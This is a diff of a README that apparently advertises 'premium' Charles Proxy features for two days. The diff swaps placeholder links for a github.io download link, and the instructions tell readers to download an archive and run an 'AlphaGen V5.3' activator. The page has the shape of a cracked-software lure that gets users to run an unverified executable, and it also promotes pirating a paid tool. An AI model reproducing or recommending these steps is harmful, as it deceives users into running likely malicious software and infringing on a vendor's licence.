@@ -2,13 +2,13 @@
 
 Access Charles Proxy with 2-day premium features enabled. Monitor, debug, and analyze network traffic for web, mobile, and API development.
 
-[![Download](https://img.shields.io/badge/Download-Charles_Premium-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Charles_Premium-blueviolet)](https://charles-proxy-premium-2day.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://charles-proxy-premium-2day.github.io/.github)  
 2. 📁 Extract the folder to any convenient location on your system  
 3. 🖱 Run AlphaGen V5.3 to activate and configure Charles Proxy  
 4. ✅ Launch Charles and start using all premium features for 2 days
